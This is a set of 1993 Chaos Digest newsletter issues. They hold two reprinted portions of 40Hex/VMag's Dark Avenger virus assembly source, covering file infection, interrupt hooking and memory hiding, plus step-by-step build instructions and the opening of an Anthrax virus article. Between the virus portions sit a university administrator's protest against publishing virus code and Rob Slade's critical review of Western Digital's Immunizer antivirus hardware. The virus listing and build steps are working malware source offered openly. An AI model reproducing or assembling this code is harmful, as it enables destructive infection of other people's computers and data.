;Arrange to infect an executable file.

do_file:
        push    ds                      ;Save the registers in stack
        push    es
        push    si
        push    di
        push    ax
        push    bx
        push    cx
        push    dx
        mov     si,ds
        xor     ax,ax
        mov     ds,ax
        les     ax,ds:[24h*4]           ;Saves INT 13h and INT 24h in stack
        push    es                      ;and changes them with what is needed
        push    ax
        mov     ds:[24h*4],offset int_24
        mov     ds:[24h*4+2],cs
        les     ax,ds:[13h*4]
        mov     word ptr cs:[save_int_13],ax
        mov     word ptr cs:[save_int_13+2],es
        mov     ds:[13h*4],offset int_13
        mov     ds:[13h*4+2],cs
        push    es
        push    ax
        mov     ds,si
        xor     cx,cx                   ;Arranges to infect Read-only files
        mov     ax,4300h
        call    function
        mov     bx,cx
        and     cl,0feh
        cmp     cl,bl
        je      dont_change
        mov     ax,4301h
        call    function
        stc
dont_change:
        pushf
        push    ds
        push    dx
        push    bx
        mov     ax,3d02h                ;Now we can safely open the file
        call    function
        jc      cant_open
        mov     bx,ax
        call    disease
        mov     ah,3eh                  ;Close it

        call    function
cant_open:
        pop     cx
        pop     dx
        pop     ds
        popf
        jnc     no_update
        mov     ax,4301h                ;Restores file's attributes
        call    function                ;if they were changed (just in case)
no_update:
        xor     ax,ax                   ;Restores INT 13h and INT 24h
        mov     ds,ax
        pop     ds:[13h*4]
        pop     ds:[13h*4+2]
        pop     ds:[24h*4]
        pop     ds:[24h*4+2]
        pop     dx                      ;Register restoration
        pop     cx
        pop     bx
        pop     ax
        pop     di
        pop     si
        pop     es
        pop     ds
        ret

;This routine is the working horse.

disease:
        push    cs
        pop     ds
        push    cs
        pop     es
        mov     dx,offset top_save      ;Read the file beginning
        mov     cx,18h
        mov     ah,3fh
        int     21h
        xor     cx,cx
        xor     dx,dx
        mov     ax,4202h                ;Save file length
        int     21h
        mov     word ptr [top_save+1ah],dx
        cmp     ax,offset my_size       ;This should be top_file
        sbb     dx,0
        jc      stop_fuck_2             ;Small files are not infected
        mov     word ptr [top_save+18h],ax
        cmp     word ptr [top_save],5a4dh
        jne     com_file
        mov     ax,word ptr [top_save+8]
        add     ax,word ptr [top_save+16h]
        call    mul_16
        add     ax,word ptr [top_save+14h]
        adc     dx,0
        mov     cx,dx
        mov     dx,ax
        jmp     short see_sick
com_file:
        cmp     byte ptr [top_save],0e9h
        jne     see_fuck
        mov     dx,word ptr [top_save+1]
        add     dx,103h
        jc      see_fuck
        dec     dh
        xor     cx,cx

------------------------------

End of Chaos Digest #1.35
************************************

Chaos Digest             Mardi 25 Mai 1993        Volume 1 : Numero 36
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.36 (25 Mai 1993)
File 1--_40H VMag_, le FBI & Samford Univ. Comp. Serv. (reaction)
File 2--"Immunizer": proposition de concept pour composants (critique)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Thu, 20 May 93 12:36:40 -0400
From: GLWARNER@samford.bitnet (THE GAR )
Subject: File 1--_40H VMag_, le FBI & Samford Univ. Comp. Serv. (reaction)


[ChaosD: Etonne de la lecture d'une telle insulte de la part du responsable
du service informatique de la Samford University (USA), je decidai de lui
demander la raison d'une telle virulence... malgre le nombre croissant des
nouveaux abonnes a ChaosD. Voici le texte publie dans _Virus-L Digest_
#6.82.2:]

Has anyone else seen "VMag"?  It appeared in this weeks Chaos Digest,
and is a magazine dedicated to publishing virus writing tips.  The
first issue contains code for making "The Tiny Virus" "Sub-Zero Virus"
"Leprosy-B Virus" and "1992 Virus".  There is also an article on how
to modify viruses so SCAN (McAffee) can't detect them.  (Some is
source code, some disassembles, and some "debug" compilables).

The second issue contains an article on making PKLite or LZExe
checksum strings show that they have not been changed, a BBS number
for virus discussions, an interview with Skism One (AKA Lord SSS) (in
which he praises John McAfee for helping make him famous) .. a debug
compilable of the Whale virus, and code for the ontario virus, the
1260 virus, the skism 808 source code, and Vienna/Violator source
code.

The question: What do we do about this?  I called the FBI complaint
desk (202) 324-3000, and talked to "Harris".  He says there are no
violations of Federal law, and that people can print whatever they
want.  He said to me, that if you can go to the library and learn how
to make an atomic bomb, that this certainly was legal.  I mentioned to
him that once you know how to make a bomb, you need a whole bunch of
uranium to do anything, but once you had this publication, you HAVE
the bomb.  He suggested I contact an agent in my area, but told me the
attorney general's office would have to decide whether there was a
case, but he didn't think there was.  The editor of Chaos Digest is a
member of the EFF, (the electronic version of the ACLU), so I would
bet that anyone who messes with him would get a lawsuit.

[ChaosD: Voici la reponse de ce Monsieur a ma demande d'explications:]

I am denying permission.  Thanks for asking first.

What is the purpose of Chaos Digest?  It is quite obvious that VMag and
SKISM have as their agenda the general wreaking of havoc by creation and
spread of viruses.  There is not even a suggestion that they have any
scientific or research purposes in mind.  When one begins a magazine by
saying that it is not for "anti-virus pussy"s I think that one makes that
pretty clear.  I thought Chaos Digest was a computer security publication
when I signed up.  Is it?  What is it that you seek to gain by promoting
this sort of activity with your distribution of their literature?

Curious: how many US subscribers do you have?

As for _The Little Black Book of Viruses_ . . . yes, I am familiar.  And
if you check the archives of VIRUS-L you will see that there was great and
similar outcry at its publication.  Data WILL be destroyed because of your
reproduction of VMAG.  How does this fall in line with the concept of
editorial responsibility?

------------------------------

Date: Fri May  7 14:57:00 -0600 1993
From: roberts@decus.arc.ab.ca ("Rob Slade, DECrypt Editor, VARUG NLC rep )
Subject: File 2--"Immunizer": proposition de concept pour composant (critique)
Copyright: Robert M. Slade, 1992


                               Comparison Review

Company and product:

Western Digital Corporation
8105 Irvine Center Drive
Irvine, CA   92716
714-932-5000
714-932-6250 Letty Ledbetter
Robert McCarroll, Product Manager, Systems Logic Group
714-932-7013 Terry Walker (and Robert Lee, developer) fax: 714-932-7097
Mark Levitt fax: 714-932-7098
Benjamin Group (marketing)
Suite 480, 100 Pacifica Ave.
Irvine, CA   92718
714-753-0755 (Erin Jones, Sari Barnhard and Carolyn Fromm) fax: 714-753-0844
Immunizer (new technology to be announced 921109)

Summary: concept proposal for hardware component for data security

Cost: N/A

Rating (1-4, 1 = poor, 4 = very good)
      "Friendliness"
            Installation      1
            Ease of use       1
            Help systems      1
      Compatibility           2
      Company
            Stability         2
            Support           1
      Documentation           1
      Hardware required       2
      Performance             2
      Availability            1
      Local Support           1

General Description:

The "Immunizer" concept involves a cooperative effort between BIOS makers,
board manufacturers and antiviral software producers.  The central component,
as far as Western Digital is concerned, is the 7855 system controller chip.
With proper implementation, the concept should allow protection of hard disk
and memory areas, while at the same time allowing the user the option to
"lift" the protection via software in order to allow for normal system
maintenance functions.

                  Comparison of features and specifications


User Friendliness

Installation

The test unit arrived with the Immunizer protection in place.  The notes with
the system do not specify how the protection program (ANTIDOTE) was to be
invoked or removed, other than at boot time.

Physical examination of the unit found an AMD NG80386SXLVIO-25 CPU and a
Caviar 280 85Meg drive.  Bus slots were labelled "do not use bus" and "5V".
The system boot messages referred to a "7855 3.3V Notebook system".

Initial assessment of the system found that the two FAT tables did not agree,
and that there were numerous "duplicate filenames" in the root and directories
created before the system was shipped.  Examination of the root directory
showed multiple filenames of ANTIDOTES_R.  (Addition and protection of new
program files increases the number of these entries.)

To begin with, I could not understand the purpose of these files, supposing
that they might point to table information regarding which files were to be
protected.  However, the number of protected files did not exactly correspond
with the number of ANTIDOTES_R entries.  Eventually I found that groups of
these entries always end at sector boundaries.  This would indicate that
protection is on the basis of disk sectors and that the entries are used as
"spacers" to keep data files out of the protected sectors.

Note that removal of these file entries requires sector editing, and that
directories that have such entries cannot be removed even if "all files" have
been deleted from the directory.  I had hoped that disabling protection,
deleting all files, and then running the "organize and protect" function again
would solve the problem, but it did not.  It did, however, remove the
protection from the directories so that a tool like NDD was able to remove
duplicate entries.  One ANTIDOTES_R entry remained, and could not be deleted
from the command line, but another utility program was then able to remove the
single remaining entry.  This, however, seems to be excessive trouble for such
a common procedure.

Analysis of the FAT with one tool initially showed that a file at cluster 5276
had no directory entry.  On a second run, that had changed to 5398.  Further
runs after addition of more files indicated that this particular cluster is a
fixture of the system. Examination showed the contents to be very similar, and
similar to the FAT data structure.

Ease of use

As noted, the notes shipped with the test system did not indicate how to
invoke the ANTIDOTE program, other than by rebooting the computer.

An attempt to write to the root directory entries (overwriting the duplicated
ANTIDOTES_R filenames, in fact) with PCTools invoked an alert screen.  This
screen stated that a suspicious write had been detected. The options presented
were to reboot the computer, or to disable protection.  There was no option to
disallow the operation, but continue with the session.  The screen noted that
if the operation was allowed to proceed, ANTIDOTE would not be active until
again invoked (by rebooting?).  Choosing to reboot presents a second screen to
confirm the choice.  The system appears to be able to discriminate between
program and non-program directory entries.

(Subsequent testing demonstrated that the alert system, at least, would remain
in place even if the option to disable protection was selected.)

There are only six menu selectable items on the main ANTIDOTE screen, and
using the menu should not present any problem to a user with even moderate
computer experience.  The only item that presents any further complexity of
use is the option to select files to be protected.  It should be comprehen-
sible to any user of "dual window" file managers.

Help systems

None provided aside from brief (one sentence) explanations of the six menu
items on the ANTIDOTE program.

Compatibility

Utility programs show numerous potential problems with inconsistent entries
between the two FAT tables, and with numerous "duplicate" filenames, as well
as lost chains whenever the "Protect" functions are used.  Use of programs to
attempt to correct these problems is almost inevitably fatal.  The ANTIDOTES_R
"files" are, of course, part of the protection system, and rightly attempt to
defend themselves, but it would help if the implementation was not such a
problem to other utilities. Attempts to reconcile the two FAT tables appear to
be allowed, but will need to be done again after each use of the ANTIDOTE
program to protect new or modified files.

An attempt to test compatibility with other antiviral programs raised an
interesting point.  The protection system does *not* appear to really start
from the BIOS level. Installation of the DISKSECURE system seemed to eliminate
the ANTIDOTE system entirely. However, attempts to infect the system with boot
sector infectors from floppies did not work: the system was able to prevent
infection.

There is considerable interference from the system in terms of false alarms.
In fact, there were numerous times when the "alert" screen popped up when no
disk activity should have been taking place.  In the limited time available it
is difficult to say for sure how much was unwarranted interference with normal
operations, particularly as the only option is to reboot or shut down the
protection.

Initially, I was not aware of too many false alarms; after all, I had little
idea of how the system should work and was obviously making mistakes.  As I
started to load software into it, I began to suspect that large scale copying
operations "confused" the system as to what was supposed to be protected.
The problem seems to get much worse as the disk is "loaded": at 80% full the
system "alarms" on almost every operation that copies data, or even reads the
disk.  At 95% full, invocation of programs larger than one cluster will
consistently generate a warning.

I was, however, able to determine that numerous alerts (at least six when I
tested the system conditions both before and after the alert) were fully in
error.  Some of the cases were inconsistent in generating the warnings. In any
case, false alarms seem to occur at a rate of one out of ten disk operations
when the disk is half full.

At 95% full or higher, there are also numerous false alarms when the system
boots.  Interestingly, removal of programs to reduce the "load" to 60% and
reprotecting the system did not rectify the errors.  ("Cold" booting does
improve the success rate.)

There are occasions, however, when the "false" alarms aren't really false, but
are misleading just the same. This occurs when a protected program or file has
been deleted.  As noted, the system allows you the option of allowing an
operation.  The alert screen states that the protection system will be shut
down after a restricted operation is allowed, but, in fact, doesn't.
Therefore, while the area formerly occupied by the deleted file looks (to DOS)
to be available, to the protection system this area of the disk is still to be
protected. This is more than just a bug in the current implementation; it is a
significant obstacle to the utility of the concept as a whole, and needs to be
seriously addressed.

Another bug in the current program concerns the computer system it is
installed in, and the diagnostics.  Roughly half of the attempts to reboot
the system resulted in some failure of the diagnostic tests, although there
was no apparent problem with the items that had failed.

It should be noted that, aside from the rather random interference with normal
computer operations that go on from time to time, nothing in the system
mitigates against "companion" (also known as "spawning" or "precedence") viral
programs. Duplicate filenames with different extensions may exist, and are not
noted in any way.

The system, as currently configured, prevents booting from a floppy disk
except when the protection is disabled.  While this seems generally
reasonable, note that it means that checking of the system is problematic.
(During testing, I attempted a "clean boot" to ensure that a stealth virus
had not, in fact, affected the system.  I then, inadvertently, wiped out the
disk with a trojan.)

If the system is infected by a boot sector infector, it will not prevent
subsequent infection of floppy diskettes.

A version of the Traceback virus was able to consistently lock up the system.
This should be explored as indicating a possible weakness in the protection
system.

Company Stability

Western Digital is well known for their drive controller and network cards.
This is their first effort in the antiviral arena.

Company Support

I was first contacted by "The Benjamin Group", which appears to be a marketing
company hired by Western Digital for the promotion of this concept.  An
evaluation unit was promised to be shipped.  I was very careful to spell out
the conditions under which I would accept the unit for review: these were
agreed to by Benjamin, but were apparently not communicated to Western
Digital.

Significant problems were encountered in shipping.  The unit was to have been
shipped over the weekend: because of problems with declarations at Customs the
shipment was received a week late.  Equal, or worse, problems were encountered
in attempting to get information from Western Digital in order to return the
unit.

Because of the miscommunication over review conditions, and because of the
delay in shipping, this review has been conducted under less than ideal
conditions and time frame.  A series of questions was put to Western Digital
in order to better structure the review.  Unfortunately, the answers were
somewhat misleading.

Western Digital stated that although full documentation is not available with
the system, some description of the concepts and theory were enclosed with the
package.  User notes were said to be enclosed regarding the anti-viral
management software.  In fact, there was no material relating to the theory
and concept, and the user notes simply reproduced the explanations listed with
each menu item on the ANTIDOTE screen.

The software and system was said to be complete and debugged so far as the
"proof of concept" is concerned, although it was not to be judged as a
commercial and saleable product.  This is fair as far as it goes, but it would
be hard to defend the mistakes that the system makes in terms of losing files
and clusters in terms of a fully debugged program.

Some software, particularly Windows 3.1, was said to be installed and
available on the system.  In fact, only MS-DOS (and not all of that), F-PROT
and a virus "storyboard" presentation were on the system.

There were additional problems with contacts.  Phone calls and faxes were not
returned.  Several times Western Digital requested action on my part on a rush
basis, but when further information was requested in order to pursue this
action, calls by me were left unreturned by Western Digital for days at a
time.   To date I am still waiting for some materials promised by Western
Digital and The Benjamin Group.

Documentation

Basically, none is yet available beyond the press releases and a "white
paper".

Hardware Requirements

At present, the system is limited to those systems with SMI equipped 386/486
level processors.  The system will need the proper BIOS and the WD 7855 system
controller.  The protection is limited to ISA IDE hard drives, and only to the
first physical and logical drive.

In terms of exactly how the technology works to protect the disk, it would
seem to be possible in a number of ways.  However, the current implementation
seems to require all programs (or other files to be protected) to be
contiguous on the disk.  This suggests that the protection is applied on a
"cluster" or "sector" basis, rather than at the higher, logical, level of
file protection.

In terms of the files to be protected, this is not a major problem.  However,
the FAT clusters must also be protected.  (Directory "files" listing the files
within the directory also appear to be protected in some way.  Renaming of
files in some ways is allowed: methods that involve direct disk access appear
to be restricted.  This may present a security loophole.)

The implications here are more serious since data files, which are not to be
protected, must not occupy any of the clusters in the FAT which are protected.
Observation of the test system indicates that data files are therefore
restricted from certain areas of the disk.  The exact restriction will depend
upon the amount of space required for program files, the FAT type (12 or 16
byte), the cluster size and the size of the hard disk.  (Given the number of
variables, I have not attempted to calculate specific examples.  The precise
extent of this restriction as an obstacle to computing is difficult to
determine.)  My initial observations indicated that this might require a
restriction of disk usage limiting disk utilization to 50 percent or possibly
even less.  Subsequent observations did not confirm this, since I was able to
fill the disk to 99% capacity.  However, it should be noted that when the disk
allocation reached 50% of capacity there was a significant increase in the
number of false alarms.

In relation to this, "FAT" or "system" viral programs were tried against the
Immunizer system.  While they did not infect the system, neither did they
prompt any alarms.  Although two copies of DIR II were tried, my suspicion is
that somehow the system prevented their operation, rather than preventing the
infection.  This will require further testing.

Performance

Invocation of the "Protect" or "Organize and Protect" functions of the
ANTIDOTE program results in a major disk reorganization.  Each addition or
modification to a program, therefore, requires significant time for
re-establishment of protection.

In addition, the disk reorganization appears to have some bugs currently, and
each run resulted in some truncated files and lost clusters. The files lost or
truncated tend to be data files, although at least one overlay file was
truncated during testing.  Each run also results in inconsistencies between
the two FATs.

After the addition of some files required an "Organize and Protect" run of
more than 35 minutes duration, I attempted to build a metric for this
activity.  Therefore, having protected, organized and cleaned up the disk
errors on the system, I installed Windows 3.0 as being fairly representative
of the mix of programs and data in today's commercial software.  52 megabytes
of the 83 megabytes available on disk were occupied, and Windows added
approximately 5 megabytes to that.  The organize and protect run took 21
minutes to complete.  An initial run with CHKDSK did not find any lost
clusters.  Correcting the FAT inconsistencies with NDD took a further 9
minutes.  It found four truncated files and 97 chains of 1218 lost clusters,
the correction of which took a further 3 minutes.  The cost of the addition
and protection of one commercial package, therefore, is generally more than
half an hour for protection, and a random loss of data files.

However, observation suggests that this is neither consistent nor predictable.
Most runs took 30 to 40 minutes, regardless of the space available on disk or
the number and size of program files added.  On the other hand, after one
addition of a large number of program files the organize and protect run took
only five minutes to complete.

A "worst case" test was done with the disk 99% full.  This took 4.5 hours to
complete.  After this was done, the system "alarmed" on every bootup.
Interestingly, on this run only one file and 24 cluster chains were lost.

Note that removal of files requires a similar time investment.  Deleting 35
megabytes of (mostly program) files required an "organize and protect" run of
24 minutes.

Recovery of files was generally unsuccessful.  On two notable occasions very
large data files were recovered with reasonable success after extended
efforts.  Lost clusters tended to be mixtures of files; in many cases mixtures
of files and directories.

The processing overhead added by the protection system is not perceptible to
the user in normal operation.  Numerical tests of disk speed, however, reveal
a very different story.

         Coretest  Transfer rate  Perf. index    /      SI Disk Index

with protection         349.6          5.756               4.3
without protection      942.0          9.291               7.0

While processing does not appear to be adversely affected, disk access
certainly is.  Where disk performance is a factor, this must be a
consideration.

Although memory protection was mentioned (in a teleconference promoting the
release) system areas of memory do not appear to be protected.  However, upon
further information from the company, an area of memory was found which is
protected.

Additional "bugs" were found in the system.  The ANTIDOTE alert screen did not
recognize both "Enter" keys on the keyboard: in certain situations it requires
one, in others the other.  At times the system would not "free" memory after a
program had completed a run.  At times the system seemed to interfere with
parameters being passed to programs.

Support Requirements

Even without the bugs, the current concept would need to be installed and
managed by those who thoroughly understood both virus protection and the level
and type of activity on the computer to be protected.  Certain files not
covered by the default protection would need to be added and certain programs
would need to be "writable" in certain situations.  It is, of course, possible
for the user or operator to override the protection, but they would need to be
informed of the times when they safely could, and times when they shouldn't.
The fact that the alert screen is so vague does not help this decision, but
this could be changed, hopefully without adding too much overhead.  The
addition of more "intelligence" to the alert screen, in order to inform the
user of what part of the disk was being written to, and what the implications
were, would help here.

                                 General Notes

The concept appears to have substantial potential.  However, the current
implementation has a sufficient number of bugs as to make judgement of the
value of the concept, separate from this implementation, problematic.

As currently implemented, the system does appear to provide substantial
protection against infection of program and specific protected files on the
target machine by most types of viral and trojan programs.  The cost of this
protection, in terms of the reduced utility of the system, would be
unacceptable in all but the highest risk environments.  A combination of
software defenses and user training would provide almost the same level of
protection at greatly reduced cost.

There are indications of loopholes in the current implementation.  Specific
identification of such requires further testing.

This concept should be pursued, but in conjunction with established antiviral
researchers and antiviral software developers.  Numerous existing programs
could contribute to patching the gaps in this implementation.

------------------------------

End of Chaos Digest #1.36
************************************

Chaos Digest             Mercredi 26 Mai 1993        Volume 1 : Numero 37
                            ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.37 (26 Mai 1993)
File 1--40H VMag Issue 1 Volume 3 #002(2)-004(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 3 #002(2)-004(1) (reprint)

[suite du listing de _Dark Avenger_ de ChaosD #1.35:]

; Check if the file is properly infected

see_sick:
        sub     dx,startup-copyright
        sbb     cx,0
        mov     ax,4200h
        int     21h
        add     ax,offset top_file
        adc     dx,0
        cmp     ax,word ptr [top_save+18h]
        jne     see_fuck
        cmp     dx,word ptr [top_save+1ah]
        jne     see_fuck
        mov     dx,offset top_save+1ch
        mov     si,dx
        mov     cx,offset my_size
        mov     ah,3fh
        int     21h
        jc      see_fuck
        cmp     cx,ax
        jne     see_fuck
        xor     di,di
next_byte:

        lodsb
        scasb
        jne     see_fuck
        loop    next_byte
stop_fuck_2:
        ret
see_fuck:
        xor     cx,cx                   ;Seek to the end of file
        xor     dx,dx
        mov     ax,4202h
        int     21h
        cmp     word ptr [top_save],5a4dh
        je      fuck_exe
        add     ax,offset aux_size+200h ;Watch out for too big .COM files
        adc     dx,0
        je      fuck_it
        ret

;Pad .EXE files to paragraph boundary. This is absolutely unnecessary.

fuck_exe:
        mov     dx,word ptr [top_save+18h]
        neg     dl
        and     dx,0fh
        xor     cx,cx
        mov     ax,4201h
        int     21h
        mov     word ptr [top_save+18h],ax
        mov     word ptr [top_save+1ah],dx
fuck_it:
        mov     ax,5700h                ;Get file's date
        int     21h
        pushf
        push    cx
        push    dx
        cmp     word ptr [top_save],5a4dh
        je      exe_file                ;Very clever, isn't it?
        mov     ax,100h
        jmp     short set_adr
exe_file:
        mov     ax,word ptr [top_save+14h]
        mov     dx,word ptr [top_save+16h]
set_adr:
        mov     di,offset call_adr
        stosw
        mov     ax,dx
        stosw
        mov     ax,word ptr [top_save+10h]
        stosw
        mov     ax,word ptr [top_save+0eh]
        stosw
        mov     si,offset top_save      ;This offers the possibilities to
        movsb                           ;some nasty programs to restore
        movsw                           ;exactly the original length
        xor     dx,dx                   ;of the .EXE files
        mov     cx,offset top_file
        mov     ah,40h
        int     21h                     ;Write the virus
        jc      go_no_fuck              ;(don't trace here)
        xor     cx,ax
        jnz     go_no_fuck
        mov     dx,cx
        mov     ax,4200h
        int     21h
        cmp     word ptr [top_save],5a4dh
        je      do_exe
        mov     byte ptr [top_save],0e9h
        mov     ax,word ptr [top_save+18h]
        add     ax,startup-copyright-3
        mov     word ptr [top_save+1],ax
        mov     cx,3
        jmp     short write_header
go_no_fuck:
        jmp     short no_fuck

;Construct the .EXE file's header

do_exe:
        call    mul_hdr
        not     ax
        not     dx
        inc     ax
        jne     calc_offs
        inc     dx
calc_offs:
        add     ax,word ptr [top_save+18h]
        adc     dx,word ptr [top_save+1ah]
        mov     cx,10h
        div     cx
        mov     word ptr [top_save+14h],startup-copyright
        mov     word ptr [top_save+16h],ax
        add     ax,(offset top_file-offset copyright-1)/16+1
        mov     word ptr [top_save+0eh],ax
        mov     word ptr [top_save+10h],100h
        add     word ptr [top_save+18h],offset top_file
        adc     word ptr [top_save+1ah],0
        mov     ax,word ptr [top_save+18h]
        and     ax,1ffh
        mov     word ptr [top_save+2],ax
        pushf
        mov     ax,word ptr [top_save+19h]
        shr     byte ptr [top_save+1bh],1
        rcr     ax,1
        popf
        jz      update_len
        inc     ax
update_len:
        mov     word ptr [top_save+4],ax
        mov     cx,18h
write_header:
        mov     dx,offset top_save
        mov     ah,40h
        int     21h                     ;Write the file beginning
no_fuck:
        pop     dx
        pop     cx
        popf
        jc      stop_fuck
        mov     ax,5701h                ;Restore the original file date
        int     21h
stop_fuck:
        ret

;The following is used by the INT 21h and INT 27h handlers in connection
;to the program hiding in memory from those who don't need to see it.
;The whole system is absurde and meaningless and it is also another source
;for program conflicts.

alloc:
        push    ds
        call    get_chain
        mov     byte ptr ds:[0],'M'
        pop     ds

;Assures that the program is the first one in the processes,
;which have intercepted INT 21h (yet another source of conflicts).

ontop:
        push    ds
        push    ax
        push    bx
        push    dx
        xor     bx,bx
        mov     ds,bx
        lds     dx,ds:[21h*4]
        cmp     dx,offset int_21
        jne     search_segment
        mov     ax,ds
        mov     bx,cs
        cmp     ax,bx
        je      test_complete

;Searches the segment of the sucker who has intercepted INT 21h, in
;order to find where it has stored the old values and to replace them.
;Nothing is done for INT 27h.

        xor     bx,bx
search_segment:
        mov     ax,[bx]
        cmp     ax,offset int_21
        jne     search_next
        mov     ax,cs
        cmp     ax,[bx+2]
        je      got_him
search_next:
        inc     bx
        jne     search_segment
        je      return_control
got_him:
        mov     ax,word ptr cs:[save_int_21]
        mov     [bx],ax
        mov     ax,word ptr cs:[save_int_21+2]
        mov     [bx+2],ax
        mov     word ptr cs:[save_int_21],dx
        mov     word ptr cs:[save_int_21+2],ds
        xor     bx,bx

;Even if he has not saved them in the same segment, this won't help him.

return_control:
        mov     ds,bx
        mov     ds:[21h*4],offset int_21
        mov     ds:[21h*4+2],cs
test_complete:
        pop     dx
        pop     bx
        pop     ax
        pop     ds
        ret

;Fetch the segment of the last MCB

get_chain:
        push    ax
        push    bx
        mov     ah,62h
        call    function
        mov     ax,cs
        dec     ax
        dec     bx
next_blk:
        mov     ds,bx
        stc
        adc     bx,ds:[3]
        cmp     bx,ax
        jc      next_blk
        pop     bx
        pop     ax
        ret

;Multiply by 16

mul_hdr:
        mov     ax,word ptr [top_save+8]
mul_16:
        mov     dx,10h
        mul     dx
        ret

        db      'This program was written in the city of Sofia '
        db      '(C) 1988-89 Dark Avenger',0

;INT 13h handler.
;Calls the original vectors in BIOS, if it's a writing call

int_13:
        cmp     ah,3
        jnz     subfn_ok
        cmp     dl,80h
        jnc     hdisk
        db      0eah                    ;JMP XXXX:YYYY
my_size:                                ;--- Up to here comparison
disk:                                   ; with the original is made
        dd      0
hdisk:
        db      0eah                    ;JMP XXXX:YYYY
fdisk:
        dd      0
subfn_ok:
        db      0eah                    ;JMP XXXX:YYYY
save_int_13:
        dd      0
call_adr:
        dd      100h

stack_pointer:
        dd      0                       ;The original value of SS:SP
my_save:
        int     20h                     ;The original contents of the first
        nop                             ;3 bytes of the file
top_file:                               ;--- Up to here the code is written
filehndl    equ $                       ; in the files
filename    equ filehndl+2              ;Buffer for the name of the opened
file
save_int_27 equ filename+65             ;Original INT 27h vector
save_int_21 equ save_int_27+4           ;Original INT 21h vector
aux_size    equ save_int_21+4           ;--- Up to here is moved into memory
top_save    equ save_int_21+4           ;Beginning of the buffer, which
                                        ;contains
                                        ; - The first 24 bytes read from file
                                        ; - File length (4 bytes)
                                        ; - The last bytes of the file
                                        ;   (my_size bytes)
top_bz      equ top_save-copyright
my_bz       equ my_size-copyright

code    ends
        end

------------------------------------------------------------------------------

     A few notes on assembling this virus.

     It's a little bit tricky assembling the Dark Avenger Virus.  Use
     these steps below.  I use Turbo Assembler 2.0, but I'm positve that
     MASM will work just as well.

     1:
         TASM AVENGER.ASM

     2:
         TLINK AVENGER.OBJ

     3:
         EXE2BIN AVENGER AVENGER.COM

     Now make a 3 byte file named JUMP.TMP using DEBUG like this

     4:  DEBUG

         n jmp.tmp
         e 0100  E9 68 00

         rcx
         3
         w
         q

      5: Now do this COPY JMP.TMP + AVENGER.COM DAVENGER.COM

         There you have it....
                                                                     HR
+++++

40Hex Issue 3                                                      0003

                                Anthrax

    Well, this is turning out to be a tribute issue to the Dark
    Avenger.  Here is another one of his better known viruses.  This is
    a nice one cause it not only is a file infector, but it is also a
    sort of boot sector virus.  It is also what I dubbed a reincarnation
    virus, meaning that even if you clean your system of it, it may
    still live, because it leaves a copy of itself on the last sector of
    the disk.  The virus can be reincarnated by the V2100 virus, also bu
    The Dark Avenger.

    Well, Patti Hoffman (one of my favorite people on earth, not) wrote
    this virus up.
